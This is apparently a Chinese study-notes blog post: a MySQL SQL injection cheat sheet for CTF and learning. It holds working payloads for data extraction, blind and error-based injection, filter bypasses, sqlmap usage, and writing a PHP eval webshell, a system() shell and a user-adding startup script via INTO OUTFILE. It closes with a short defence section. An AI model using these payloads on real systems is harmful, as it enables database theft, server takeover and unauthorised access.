---
layout:     post
title:      Web笔记（一）SQL注入之MySQL
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是MySQL的SQL注入。
date:       2020-11-26
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - SQL注入
    - MySQL
---


## 0x00 SQL注入简介

SQL注入就是通过把SQL命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。

SQL注入发生位置可以是HTTP数据包中的任意位置。

为了方便说明，所有示例都用`http://www.xxx.com/1.php?id=1`作为注入点，id=1可能为字符型也可能为数值型，视具体情况而定。



## 0x01 判断有无注入点

```
# 测试网站反应
id=1-0	# 看有无报错，没有可能存在数值型注入，需进一步测试
id=1'	# 看有无报错，还可以尝试用双引号或者反斜杠测试

# 第一个正常，第二个异常，存在数值型注入点
id=1 and 1=1 -- -
id=1 and 1=2 -- -

# 第一个正常，第二个异常，存在字符型注入点
id=1' and '1'='1
id=1' and '1'='2
```
还可以用异或注入测试注入点：

```
# 如果第一个为真，第二个为假，存在数值型注入点
id=1^1^1
id=1^1

# 如果第一个为真，第二个为假，存在字符型注入点
id=1'^'1'^'1
id=1'^'1
```

下面是一些**万能密码**，如果下述注入成功，也可以说明存在注入点：

```
id=1' or 'a'='a			# 最后面直接与sql语句的分号闭合，就不需要注释符，以此判断为字符型注入
id=1' or 1=1 #			# 井号注释，可以判断为mysql数据库
id=1' or 1=1 -- -		# -- -或--+注释，MySQL或Mssql都可以
id=1' or 1=1;--			# ;--注释，可以判断为Mssql数据库
```



## 0x02 判断数据库类型

SQL Server、Oracle以及MySQL的字符串连接符各不相同，利用这一点不同可以用来识别各自的SQL注入漏洞。向Web服务器发送下面两个请求：

- 如果以下两个请求结果相同，则很可能存在SQL注入漏洞，且数据库为SQL Server。

```
id=jack
id=ja'+'ck
```

- 如果以下两个请求结果相同，则很可能存在SQL注入漏洞，且数据库为Oracle。

```
id=jack
id=ja'||'ck
```

- 如果以下两个请求结果相同，则很可能存在SQL注入漏洞，且数据库为MySQL。

```
id=jack
id=ja''ck
```



## 0x03 简单暴露

在注入点处插入以下payload测试

```
id=1' or 1=1 -- -
id=-1' union select 1  -- -
id=-1' union select 1, 2 -- -
id=-1' union select 1, 2, 3 -- -
id=-1' order by 3 -- -
...... 
```

注意：

- \' 号前用1或者其他的，也可以置空，视注入语句需要的情况而定，如果是需要前面为真，则需要id等于一个存在的值，如果是要假，则找一个不存在的值即可。

- 最后面的 “\-\- -” （注意中间有空格）是用来注释的，也可以用 “\-\-\+” 或 “\#” 。

上面这些是用来测试使用了多少个字段，知道了字段数之后可以进行的数据库信息查询。

```
id=-1' union select 1, database() -- -		# 输出当前数据库名
id=-1' union select 1, user() -- -		# 输出当前用户名
id=-1' union select 1, version() -- -		# 输出数据库版本信息
```
如果需要输出的字段比原来输出的少，可以用下面这句进行拼接输出，利用concat或group_concat函数进行拼接。
```
id=-1' union select username, concat("passwd, user_id, age") -- -
```



## 0x04 information_schema查询

在MySQL 5.0以上就有information_schema库，记录所有数据库名、表名和列名信息，因此可以利用该内置库查询信息，乃至脱库。

```
# 查看数据库名
id=-1' union select schema_name from information_schema.schemata -- -

# 查看表名
id=-1' union select table_schema, table_name from information_schema.tables -- -

# 查找列名
id=-1' union select table_schema, column_name from information_schema.columns where schema_name='[库名]' and table_name='[表名]' -- -

# 列举某个数据库下的所有表名
id=-1' union select group_concat(table_name) from information_schema.tables where table_schema = '[库名]' -- -

# 列举某个表下的所有列名
id=-1' union select group_concat(column_name) from information_schema.columns where table_name = '[表名]' -- -

# 直接就用select查询数据
id=-1' union select [列名] from [表名] -- -
```

注：MySQL版本小于5.0则需要字典爆破库名、表名和列名。



## 0x05 盲注

盲注是注入攻击的一种，向数据库发送true或false这样的问题，并根据应用程序返回的信息判断结果，这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题。

#### 1. 基于时间的盲注

```
id=1' and if(ascii(substr(database(),0,1))<N, sleep(3), 1) -- -
id=1' and if(ascii(substr(database(),0,1))>N, sleep(3), 1) -- -
id=1' and if(ascii(substr(database(),0,1))=N, sleep(3), 1) -- -
```

当数据库名第一个字母的ascii码小于、大于或等于N时，执行一次sleep(3)函数等待3秒，依据响应的时间，可以判断执行成功或失败，进而逐步找出字符并拼接形成数据库名。

将database()函数替换成其他注入语句就可以进行其他查询。

另外还有其他时间盲注方法：

```
# 当前数据库名长度大于N时，延时5秒
id=1' and (select if(length(database())>N, sleep(5), null) -- -

# 当前数据库名长度大于N时，不延时，反之延时5秒
id=-1' or (length(database()))>N or if(1=1, sleep(5), null) or '1'='1 
```

#### 2.  基于布尔的盲注

```
id=1' and length(database()) -- -
id=1' and substr(database(), 1, 1) -- -
id=1' and ascii(substr(database(), 0, 1)) -- -
id=1' and ascii(substr(database(), 0, 1))>N -- -
id=1' and ascii(substr(database(), 0, 1))=N -- -
id=1' and ascii(substr(database(), 0, 1))<N -- -
```

原理同时间盲注，就看正常输出还是页面异常。



## 0x06 报错注入

注意：由于报错信息有时会有长度限制，所以最好使用`limit 0,1`这样的语句逐个查询，在第2种报错注入updatexml中会提及一下怎么一次全爆破，后面都只说明如何逐个查询。

#### 1. floor报错注入

报错注入形式上是两个嵌套的查询，即select...(select...)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及函数：

- rand()随机函数，返回0~1之间的某个值。
- floor(a)取整函数，返回小于等于a，且值最接近a的一个整数。
- count()聚合函数也称作计数函数，返回查询对象的总数。
- group by clause分组语句，按照查询结果分组。
- floor(rand(0)\*2)是定性的011011，并不是真随机，而是伪随机，这句会引起报错，从而配合其它语句输出报错信息来达到泄露。
- ()x 是对括号内容的命名，把括号里面的命名为x。
- 另外需要注意的是最后面的一个`from information_schema.tables`是固定的，不管什么操作都不用变，也可以换成其他数据库和表，但都不影响。

下述中0x7e是波浪线，这里用来分隔输出，看起来方便点。

```
# 获取数据库信息
id=-1' union select 1,2,3 from (select count(*),concat((select concat(0x7e, version(),0x7e,database(),0x7e,user(),0x7e) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -

# 获取一个库名
id=-1' union select 1,2,3 from (select count(*),concat((select concat(0x7e, schema_name, 0x7e) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -

# 获取一个表名
id=-1' union select 1,2,3 from (select count(*),concat((select concat(0x7e, table_name,0x7e) from information_schema.tables where table_schema='[库名]' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -

# 获取一个列名（字段）
id=-1' union select 1,2,3 from (select count(*),concat((select concat(0x7e, column_name, 0x7e) from information_schema.columns where table_name='[表名]' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -

# 获取一行数据
id=-1' union select 1,2,3 from (select count(*),concat((select concat(0x7e, [字段1], 0x7e, [字段2], 0x7e) from [库名].[表名] limit 0,1), floor(rand(0)*2))x from information_schema.tables group by x)a -- -
```

#### 2. updatexml报错注入

MySQL 大于等于5.1.5才能用updatexml报错注入。

updatexml(xml_document, xpath_string, new_value)

- 第一个参数：XML文档对象名称（可以用数字代替）

- 第二个参数：XPath字符串（一般就是让这个参数部位正则字符串引起报错）

- 第三个参数：替换查找到的符合条件的数据

```
# 查看版本信息
id=1' and updatexml(1, concat(0x7e, version(), 0x7e),1) -- -

# 查找第一个数据库
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),1)  -- -

# 查找第二个数据库，以此类推
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 1,1),0x7e),1)  -- -

# 依次查找表名
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema='[库名]' limit 0,1),0x7e),1)  -- -

# 依次查找列名
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name='[表名]' limit 0,1),0x7e),1)  -- -

# 依次爆数据
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select concat([字段1],0x7e,[字段2])),0x7e) FROM [库名].[表名] limit 0,1),0x7e),1)  -- -

# 一次查出所有库名（但是报错信息有长度32位限制，所以最好逐个查）
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(schema_name)),0x7e) FROM information_schema.schemata),0x7e),1)  -- -

# 一次查出所有表名（但是报错信息有长度32位限制，所以最好逐个查）
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(table_name)),0x7e) FROM information_schema.tables where table_schema='[库名]'),0x7e),1)  -- -

# 一次查找某个表下所有列名（但是报错信息有长度32位限制，所以最好逐个查）
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) FROM information_schema.columns where table_name='[表名]'),0x7e),1) -- -

# 一次爆出全部数据（但是报错信息有长度32位限制，所以最好逐个查）
id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat([列名1],0x3a,[列名2])),0x7e) FROM [库名].[表名]),0x7e),1)  -- -
```

其中：

- distinct表示返回后面的内容不重复。
- 0x7e为波浪线，用于分隔。
- 0x3a为冒号，用于分隔。
- group_concat()会把结果按照输入的字段进行分组拼接，每组拼成一个字符串，组与组之间用逗号隔开，再拼接成一个完整的字符串。

update注入就常用updatexml函数来注入：

```
id=-1' or updatexml(1, concat(0x7e, version(), 0x7e), 1) -- -
```

#### 3. extractvalue报错注入

MySQL 大于等于5.1.5才能extractvalue报错注入。

```
# 获取基础信息
id=1' and extractvalue(1,concat(0x7e,user(),0x7e)) -- -
id=1' and extractvalue(1,concat(0x7e,database(),0x7e)) -- -
id=1' and extractvalue(1,concat(0x7e,version(),0x7e)) -- -

# 获取一个库名
id=1' and extractvalue(1,concat(0x7e,concat(0x7e,(select concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),0x7e)) -- -

# 获取一个表名
id=1' and extractvalue(1,concat(0x7e,concat(0x7e,(select concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema='[库名]' limit 0,1),0x7e),0x7e)) -- -

# 获取一个列名
id=1' and extractvalue(1,concat(0x7e,concat(0x7e,(select concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name='[表名]' limit 0, 1),0x7e),0x7e)) -- -

# 获取一行数据
id=1' and extractvalue(1,concat(0x7e,(select concat(0x7e, (select concat([字段1],0x3a,[字段2])),0x7e) FROM [库名].[表名] limit 0,1),0x7e)) -- -
```

#### 4. exp报错注入

目前测试MySQL 5.5可用，5.0、5.1、5.7、8.0均不能用

```
# 获取基础信息
id=1' and exp(~(select * from(select user())a)) -- -
id=1' and exp(~(select * from(select database())a)) -- -
id=1' and exp(~(select * from(select version())a)) -- -

# 获取一个库名
id=1' and exp(~(select * from(select concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1)a)) -- -

# 获取一个表名
id=1' and exp(~(select * from(select concat(0x7e, (select table_name), 0x7e) FROM information_schema.tables where table_schema='[库名]' limit 0,1)a)) -- -

# 获取一个列名
id=1' and exp(~(select * from(select concat(0x7e, (select column_name), 0x7e) FROM information_schema.columns where table_name='[表名]' limit 0,1)a)) -- -

# 获取一行数据
id=1' and exp(~(select * from(select concat(0x7e, (select concat([字段1],0x3a,[字段2])),0x7e) FROM [库名].[表名] limit 0,1)a)) -- -
```

#### 5. geometrycollection报错注入

目前测试在MySQL5.1、5.5版本中可以报错user()执行结果，5.0、5.7、8.0都不行。

```
# 获取基础信息
id=1' and geometrycollection((select * from(select * from(select user())a)b)) -- -
id=1' and geometrycollection((select * from(select * from(select database())a)b)) -- -
id=1' and geometrycollection((select * from(select * from(select version())a)b)) -- -

# 获取一个库名
id=1' and geometrycollection((select * from(select * from(select concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1)a)b)) -- -

# 获取一个表名
id=1' and geometrycollection((select * from(select * from(select concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema='[库名]' limit 0,1)a)b)) -- -

# 获取一个列名
id=1' and geometrycollection((select * from(select * from(select concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name='[表名]' limit 0, 1)a)b)) -- -

# 获取一行数据
id=1' and geometrycollection((select * from(select * from(select concat(0x7e, (select concat([字段1],0x3a,[字段2])),0x7e) FROM [库名].[表名] limit 0,1)a)b)) -- -
```

#### 6. polygon报错注入

同GeometryCollection报错注入。

```
id=1' and polygon((select * from(select * from(select user())a)b)) -- -
```

#### 7. multipoint报错注入

同GeometryCollection报错注入。

```
id=1' and multipoint((select * from (select * from(select user())a)b)) -- -
```

#### 8. multilinestring报错注入

同GeometryCollection报错注入。

```
id=1' and multilinestring((select * from (select * from(select user())a)b)) -- -
```

#### 9. multipolygon报错注入

同GeometryCollection报错注入。

```
id=1' and multipolygon((select * from (select * from(select user())a)b)) -- -
```

#### 10. linestring报错注入

同GeometryCollection报错注入。

```
id=1' and linestring((select * from(select * from(select user())a)b)) -- -
```



## 0x07 编码注入

#### 1. 宽字节注入

GBK占用两字节，ASCII占用一字节，PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。

%DF\'：被PHP当中的addslashes函数转义为 %DF\\\'，\\ 即URL里的 %5C，也就是说，%DF\\\' 会被转成 %DF%5C%27 。倘若网站的字符集是GBK编码的，MySQL使用的编码也是GBK的话，就会被认为 %DF%5 是一个宽字符。编码之后是“運”。

```
id=1%df%27 union select 1,2,3 -- -
```

或者sqlmap对宽字节注入，直接注入需要将%df放在链接中：

```
sqlmap -u "http://xxx.com/xxx.php?id=1%df%27" --dbs
```

也可以使用sqlmap tamper脚本，其中unmagicquotes.py是专门用于宽字节注入的脚本：

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --tamper=unmagicquotes.py --dbs
```

最常使用的宽字节注入是利用%df，其实只要第一个ascii码大于128就可以了，比如ascii码为129的就可以，但是我们怎么将它转换为URL编码呢，其实很简单，我们先将129（十进制）转换为十六进制，为0x81，然后再十六进制前面加%即可，即为%81。GBK首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F）。如下面这个例子用的是%bf

```
id=1%bf' union selelct 1,2,3 -- -
```

#### 2. 二次URL编码注入

如果后台在用户输入的数据入库之前做了一次URL解码，那就注入攻击时就需要二次URL编码，一次是给WebServer正常解码，另一次就是给后台URL解码用的。

php中如果使用了urldecode或rawurldecode函数来解码，那么就需要二次URL编码注入。后台代码示例如下：

```php
<?php
$a=addslashes($_GET['id']);
$b=urldecode($a);
echo '$a='.$a;
echo '<br />';
echo '$b='.$b;
//后面入库代码省略
?>
```

代码先对\'、\"、\\、Null等符号做了转义，然后URL解码。那么我们只需要注入下面代码即可绕过addslashes转义和urlencode编码：

```
id=%2531%2527%2520%256f%2572%2520%2527%2531%2527%253d%2527%2531
# 经过WebServer自动解码后
id=%31%27%20%6f%72%20%27%31%27%3d%27%31
# 经过后台urldecode函数后
id=1' or '1'='1
```



## 0x08 二次注入

二次注入是指，输入一个带有SQL注入语句的字符串，提交后，在另一处输入时二次修改（如注册账户时注入，修改账号密码时二次注入），这种注入需要一定技巧。

举个例子吧，我们不知道网站的admin用户的密码，现在要利用二次注入修改其密码达到攻击的目的。

- 首先我们注册一个用户名为“admin\' -- -”的用户，密码随意。

- 再在登录页登录这个“admin\' -- -”用户。
- 跳转到修改密码的页面，输入“admin\' -- -”，这里是利用update语句对admin账户进行攻击：

```sql
update users set password='$pass' where username='$username';
# 修改为
update users set password='123456' where username='admin' -- -';
```

- 这样admin后面的内容相当于注释，是不执行的，这样就修改了admin的密码，我们就可以用自己设置的密码登上admin账户了。



## 0x09 异或注入

异或注入类似布尔盲注，利用异或运算后的结果是真或假来判断注入语句执行情况。

A语句^B语句：

- 如果A、B都为真或者都为假，那么结果为假；
- 如果A、B一真一假，那么结果为真。

可以利用这一点测试后端过滤了哪些关键词：

```
# 如果结果为真，说明存在select等关键词过滤
id=1'^(length('select')!=0) -- -
id=1'^(length('union')!=0) -- -
id=1'^(length('or')!=0) -- -
id=1'^(length('and')!=0) -- -
```

也可以判断注入点

```
# 如果第一个为真，第二个为假，存在数值型注入点
id=1^1^1
id=1^1

# 如果第一个为真，第二个为假，存在字符型注入点
id=1'^'1'^'1
id=1'^'1
```



## 0x0a HTTP头注入

####  1. 注入类型

前面所说都是基于GET方式的注入，除此之外还有基于POST方式的注入，HTTP头还有很多可能存在注入的地方。如：

- POST方式注入
- referer的注入
- user-agent注入
- x-forwarded-for注入
- client-ip注入
- cookie注入

#### 2. user-agent注入、client-ip注入、x-forwarded-for注入

注入流程跟GET方式注入是一样的，只不过换了一个输入的位置。HTTP头的注入位置有时候不太好猜，可以利用sqlmap进行自动化注入，但需要注意，sqlmap需要level为2时才会进行cookie注入，level为3时才会进行HTTP头其他类型的注入。

- 利用Burpsuite设置代理，抓取HTTP请求内容，保存为target.txt文件中。
- 如果测试referer注入，则修改target.txt文件，在referer的值后面，加上\*号并保存，然后使用sqlmap自动攻击：

```
sqlmap -r target.txt --current-db --level 3
```

user-agent、client-ip、x-forwarded-for的注入同理。

#### 3. cookie注入

cookie注入一般是因为后台使用$\_REQUEST[\'xxx\']，而不是$\_GET[\'xx\']或者$\_POST[\'xxx\']。

- 利用sqlmap进行注入

```http
cookie:{uname=admin*; test=test}
```

cookie注入也是，在admin后加\*号表示注入点。

```
sqlmap -r target.txt --level 2
# 或者
sqlmap -u "http://xxx.com/xxx.php" --cookie "id=1" --level 2
```

- 手工注入

可以利用Burpsuite抓包改cookie，可以利用Chrome浏览器地址栏执行js代码修改cookie，首先要访问正常的存在注入点的页面，等页面完全打开之后，清空地址栏，输入

```javascript
javascript:alert(document.cookie="id="+escape("1 and 1=1"))
```

这个时候再去访问页面就会携带上面设置的cookie，我们再次访问页面看是否正常。这里escape()的参数就是注入的部分，往里面写

```javascript
javascript:alert(document.cookie="id="+escape("1 and 1=2 select 1,2,3,4,5,6,7,8 from admin"))
......
```

#### 4. post注入

```
sqlmap -u "http://xxx.com/xxx.php" --data "id=1"
或者
sqlmap -u "http://xxx.com/xxx.php" --form
```

常见post注入情况：

- 注册用户
- 登录账号
- 留言
- 修改账号
- 修改个人资料
- 上传文件
- 搜索框



## 0x0b ffifdyop注入破解MD5

“ffifdyop”这一字符串的md5值，转化成字符串开头有：`'or'`，可以用于带有MD5的SQL注入。

例如：

```sql
select * from 'admin' where username='.md5($password, True)'
```

当`$password='ffifdyop'`时，SQL语句就变成这样：

```sql
select * from 'admin' where username=''or'6xxxx'
```

经过MD5并转换成字符串之后会引起SQL注入。



## 0x0c load_file文件读取

#### 1. load_file注意事项

load_file()函数是来读取文件的函数，只能读取绝对路径的文件。在注入网站使用load_file()时应先找到网站的绝对路径。例如：

- d:/www/xx/index.php
- /usr/src/apache/htdoc/index.php

注意：

- Windows下的路径符号"\\"错误，"\\\\"正确，"/"正确
- 输入文件名可以用十六进制，但记得十六进制不需双引号

而网站根路径获取方式有：

- 报错显示
- 谷歌hacker
- site:目标网站 warning
- 遗留文件 phpinfo、info、test php
- 漏洞爆路径
- 读取配置文件
	- /etc/httpd/conf/httpd.conf
	- user/local/httpd/conf/httpd.conf
	- c:/windows/system32/inetsrv/metabase.xml  	IIS中间件情况下

#### 2. load_file使用方法

直接load_file导入文件内容

```
id=-1' union select 1, load_file('E:\flag.txt'),3 -- -
```

#### 3. 需要开启的配置

Windows下的MySQL想要load_file函数可以使用需要配置一下，在my.ini中添加这句话`secure_file_priv= `：

```ini
[mysqld]
port=3306
basedir=D:/php/phpStudy_64/phpstudy_pro/Extensions/MySQL5.7.26/
datadir=D:/php/phpStudy_64/phpstudy_pro/Extensions/MySQL5.7.26/data/
character-set-server=utf8
default-storage-engine=MyIsam
#支持INNODB引擎模式。修改为default-storage-engine=INNODB即可。
#如果INNODB模式如果不能启动，删除data目录下ib开头的日志文件重新启动。
secure_file_priv=         #就是这一句！！！！！
max_connections=100
collation-server=utf8_unicode_ci
init_connect='SET NAMES utf8'
innodb_buffer_pool_size=64M
innodb_flush_log_at_trx_commit=1
```

然后保存重启mysql，进入mysql命令行之后，可以输入以下命令查询：

```mysql
show global variables\G;
```

而如果是Linux下的MySQL，则需要在/etc/my.cnf的[mysqld]下面添加`local-infile=0`选项。



## 0x0d outfile写入文件 

#### 1. 需要开启的配置

首先需要确认数据库开启了写入文件的功能，先在MySQL命令行中查询一下general_log是否开启，没有的话输入`set global general_log=on;`设置开启。

```mysql
mysql> show global variables like "general_log";
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| general_log  | OFF  |
+---------------+-------+
1 row in set, 1 warning (0.01 sec)
mysql> set global general_log=on;
Query OK, 0 rows affected (0.02 sec)
mysql> show global variables like "general_log";
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| general_log  | ON  |
+---------------+-------+
1 row in set, 1 warning (0.01 sec)
mysql>
```

然后才能进行写入到文件中，下面是将内容`<?php phpinfo();?>`写入到文件E:\\\\1.php。

注意：

- windows系统下路径中一定要用双反斜杠。

- 写入的文件名不可以用十六进制，必须引号。

```
id=-1' union select 1, '<?php phpinfo();?>', 3 into outfile 'E:\\1.php' -- -  
```

#### 2. 写入webshell

```
id=-1' union select 1,'<?php @eval($_POST['x']);?>',3 into outfile 'E:\\1.php' -- -
```

#### 3. 利用outfile执行系统命令

利用注入漏洞执行系统命令。

- 第一种方法：写成bat文件，需要使用wamp环境搭建，需要系统权限才能执行。

```
id=-1' union select 1, "net user seven 123 /add",2,3,4,5,6 into outfile 'C:/Users/User/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/xxx.bat' -- -
```

- 第二种方法：写成php文件，用system函数执行用户输入。

```
id=1' union select 1,"<pre><body><?php @system($_GET['cc']);?></body></pre>",3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile 'C:/xxx/wwwroot/xxx.php' -- -
```



## 0x0e 绕过技巧

#### 1. 双写绕过

```
seleselectct、uniunionon、oorr等
```

#### 2. 大小写绕过

```
UniON、SelEct、Or、aNd等
```

#### 3. 编码绕过

有时候会过滤单引号、双引号，那就可以对需要引号包含起来的内容，进行十六进制编码，编码后就不需要引号了。

```
'admin' -> 0x61646d696e
例如
id=-1 and union select 1,password from users where username=0x61646d696e -- -
```

#### 4. 内联注释绕过

内联注释就是把注释内容当做sql语句执行，通常可以绕过WAF。

```
id=-1 and /*! union */ /*! select */ * from [表名] where [条件] -- -
```

#### 5. 绕过注释符过滤

在最后用单引号直接闭合或者用or '1'='1来代替注释符--+、-- 、#。

#### 6. 绕过and和or过滤

- 大小写绕过：or, OR, oR, Or, And, ANd, aND等。

- 注释绕过：在敏感词中间添加注释，a/\*\*/nd。
- 双写绕过：oorr。
- 利用符号替代：and用\&\&替代，or用\|\|替代

#### 7. 绕过空格过滤

- %0a 换行符代替空格

- %09 tab键代替空格

- %20 空格，url编码代替直接空格

- %0c 新的一页代替空格

- %0d return功能%0b TAB键（垂直）

#### 8. 绕过select、union关键词过滤

- 大小写绕过

- 双写绕过

- 堆叠注入+预编译+concat字符拼接

```mysql
id=1';set @sql=concat('s','elect * from `db`');PREPARE pre FROM @sql;EXECUTE pre; -- -
```

注意：保险起见，表名为数字时最好用反引号变为字符串，以防出错。



## 0x0f MySQL知识点

#### 1. MySQL函数

- system_user()  系统用户名
- user()       用户名
- current_user()  当前用户名
- session_user()  连接数据库的用户名
- database()    数据库名
- version()     MySQL数据库版本
- load_file()   转成16进制或者10进制MySQL读取本地文件的函数
- @@datadir     读取数据库路径
- @@basedir     MySQL安装路径
- @@version_compile_os  操作系统

#### 2. MySQL数据库连接

```php
<?php
$host='localhost';  //数据库地址
$database='sui';         //数据库名称
$user='root';            //数据库账户
$pass='';               //数据库密码
$webml='/0/';           //安装文件夹
?>
```

一般CMS网站在这些文件下可能找到：
- config.php

- db_config.php

- include/common.inc.php

类似名称中带config的文件都有可能。

#### 3. MySQL特性
- MySQL中的大小写不敏感。

- MySQL中的十六进制编码或者URL编码的语句，和编码前的语句含义一样，可以直接代替

- 符号和关键字替换and等价于\&\&、or等价于\|\|

- 内联注释： /\*! 内联注释 \*/

- 单行注释：--+或--空格 或#

- 多行注释：/\* 多行注释内容 \*/

#### 4. 辅助字符 \\G

\\G 功能是帮助查看，转成更加人性化的输出方式。

```mysql
select * from information_schema limit 20\G;`
```

limit 20 是限制了只取20条记录，\\G转化成容易看的形式。



## 0x10 SQL注入防御

#### 1. php配置层面的防御

- 使用**magic_quotes_gpc**函数对GET、POST、Cookie的值进行过滤。

- 使用**magic_quotes_runtime**函数对从数据库或者文件中获取的数据进行过滤。

但是上面这两个函数值对\'、\"、\\、Null四个字符进行过滤，所以对于数值型注入是没有多大用处的。

在php4.2.3及以前的版本可以在任何地方设置开启（配置文件、代码中），之后的版本可以在php.ini、httpd.conf以及.htaccess中开启。

#### 2. 过滤函数和类

通常在程序入口处统一过滤，或者在SQL语句运行之前使用。

- 使用**addslashes**函数对变量进行过滤，同样只会对\'、\"、\\、Null四个字符进行过滤。

- 使用**mysql_real_escape_string**函数和**mysql_escape_string**函数，对\\x00、\\n、\\r、\\、\\'、\\"、\\x1a等字符进行过滤，推荐使用mysql_real_escape_string函数，因为其会根据当前字符集转义字符串。

- 使用**intval**、**floatval**等函数进行字符类型转换，将变量转换成int类型、float类型等。

#### 3. PDO prepare预编译

```php
<?php
$db = new PDO("mysql:host=localhost; dbname=test", "user", "pass");
$db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$db->exec("set names 'utf8'");
$sql="select * from test where name = ? and password = ?";
$stmt = $db->prepare($sql);
$res = $stmt->execute(array($name, $pass));
?>
```

其中，setAttribute设置ATTR_EMULATE_PREPARES为false，是因为php在5.3.6版本之前是使用了php本地模拟prepare后，再把完整的SQL语句发给MySQL服务器。在这种情况下如果设置GBK编码，则存在宽字节注入。因此需要禁用php本地模拟prepare。